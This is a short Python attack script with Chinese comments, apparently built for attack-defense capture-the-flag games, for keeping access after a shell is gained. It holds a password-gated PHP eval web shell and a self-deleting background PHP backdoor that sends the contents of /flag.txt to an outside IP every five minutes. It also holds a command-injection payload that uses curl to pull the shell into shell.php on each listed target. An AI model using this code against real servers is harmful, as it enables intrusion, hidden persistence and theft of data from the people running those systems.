from get_host import *
url = clear_url,http_url,https_url #ip http https
import requests
#在已经得到shell后权限维持
'''a.txt | f1=zbugeek | f2=code
<?php
if(md5($_GET['f1'])==="e2af32e5ef1d618985cb72580064ebe3")
{
    @eval($_GET['f2']);
}
?>
'''
'''主动马 推荐
<?php 
set_time_limit(0); // 取消脚本运行时间的超时上限
ignore_user_abort(1);  // 后台运行
unlink(__FILE__);    //删除本文件
while(1){
    $file="/flag.txt";  //设定要读取的文件
    $flag=file_get_contents($file);
    //在自己的计算机上打开服务器，输入ip让其访问。并创建一个php记录访问的值，jiflag
    $url="http://192.168.1.1/index.html?flag=".$flag;
    $html=file_get_contents($url);
    sleep(60 * 5);  //定时发送
	}
?>
'''
payload = '?id=system("curl 127.0.0.1/a.txt >> shell.php");'
for i in url[1]:
    u = i + payload
    html = requests.get(u)

